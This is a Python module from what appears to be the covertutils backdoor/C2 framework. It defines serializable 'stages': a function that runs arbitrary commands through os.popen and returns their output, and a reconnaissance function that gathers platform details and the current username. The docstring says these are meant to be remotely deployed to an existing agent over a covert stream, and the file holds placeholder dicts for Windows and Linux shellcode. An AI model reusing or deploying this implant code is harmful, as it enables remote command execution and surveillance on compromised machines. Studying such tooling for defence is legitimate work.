"""
This module provides the :data:`CommonStages` dict which contains functions properly implemented for use alogn with :class:`covertutils.Handlers.FunctionDictHandler.FunctionDictHandler` and subclasses.

The :data:`Stages.CommonStages` contents are arranged by feature as follows::

    CommonStages['shell']       # Contains another dict with keys every usable instance of the `shell` feature.
    CommonStages['shell']['function']       # Contains the actual pointer to the `shell` function. This function executes its argument directly to the Operating System's shell and returns the Standard Output.
    CommonStages['shell']['marshal']        # Contains a serialized representation of `shell` function using the `python marshal` build-in module.

`marshal` stages are suitable for use with :class:`covertutils.Handlers.StageableHandler.StageableHandler`. They can be remotely deployed to an existing agent and called via a specified `stream`.

.. code:: python

    >>> from covertutils.Stages import CommonStages
    >>>
    >>> CommonStages['shell']['function']("echo 1")
    '1\\n'
    >>> CommonStages['shell']['marshal']
    'c\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x02\\x00\\x00\\x00C\\x00\\x00\\x00s&\\x00\\x00\\x00d\\x01\\x00d\\x02\\x00l\\x00\\x00m\\x01\\x00}\\x01\\x00\\x01|\\x01\\x00|\\x00\\x00\\x83\\x01\\x00j\\x02\\x00\\x83\\x00\\x00}\\x02\\x00|\\x02\\x00S(\\x03\\x00\\x00\\x00Ni\\xff\\xff\\xff\\xff(\\x01\\x00\\x00\\x00t\\x05\\x00\\x00\\x00popen(\\x03\\x00\\x00\\x00t\\x02\\x00\\x00\\x00osR\\x00\\x00\\x00\\x00t\\x04\\x00\\x00\\x00read(\\x03\\x00\\x00\\x00t\\x07\\x00\\x00\\x00messageR\\x00\\x00\\x00\\x00t\\x06\\x00\\x00\\x00result(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00s\\x15\\x00\\x00\\x00covertutils/Stages.pyt\\x0e\\x00\\x00\\x00__system_shell\\x04\\x00\\x00\\x00s\\x06\\x00\\x00\\x00\\x00\\x01\\x10\\x01\\x12\\x01'

"""


import pickle
import marshal

def __system_shell( message ) :
    from os import popen
    result = popen( message ).read()
    return result


def __system_info( message ) :
    import platform,json, getpass
    ret = {                     #  131 bytes
        'm' : platform.machine(),
        'v' : platform.version(),
        'p' : platform.platform(),
        's' : platform.system(),
        'c' : platform.processor(),
        'u' : getpass.getuser()
    }

    # ret = [                   # 113 bytes
    #     platform.machine(),
    #     platform.version(),
    #     platform.platform(),
    #     platform.system(),
    #     platform.processor(),
    #     getpass.getuser()
    # ]
    return json.dumps(ret).replace( " ","" )    # to save some bytes


def __system_info_handler( message ) :
    pass



CommonStages = {}
CommonStages['shell'] = {}
CommonStages['shell']['function'] = __system_shell
CommonStages['shell']['marshal'] = marshal.dumps( __system_shell.func_code )
CommonStages['sysinfo'] = {}
CommonStages['sysinfo']['function'] = __system_info
CommonStages['sysinfo']['marshal'] = marshal.dumps( __system_info.func_code )



WindowsStages = {}
WindowsStages['shellcode'] = {}


LinuxStages = {}
LinuxStages['shellcode'] = {}
